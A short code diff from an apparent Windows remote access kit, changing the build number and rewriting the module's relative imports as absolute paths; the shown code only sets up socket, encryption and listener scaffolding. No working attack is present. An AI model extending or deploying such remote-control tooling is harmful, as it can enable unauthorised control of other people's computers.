@@ -10,17 +10,17 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.2
+# Build:  1.0.21
 # -------------------------------------------------------------
 import socket
 import base64
 
-from ..utils.utils import ErrorHandling
-from ..networking.IP_Handler import IPAddress
-from ..threading.threads import MultiThreading
-from ..logging.logging import ConsoleWindow,ClientWindow,NetworkingConfigs,DiscordCFG
-from ..encryption.aes128 import Encryption,Decryption
-from ..utils.utils import Notifications
+from core.utils.utils import ErrorHandling
+from core.networking.utils.IP_Handler import IPAddress
+from core.threading.threads import MultiThreading
+from core.logging.logging import ConsoleWindow,ClientWindow,NetworkingConfigs,DiscordCFG
+from core.encryption.aes128 import Encryption,Decryption
+from core.utils.utils import Notifications
 
 server_socket_obj_array = []    #User created listeners/sockets are stored here
 client_socket_obj_array = []    #Client socket object is stored here. This is used to interact with client
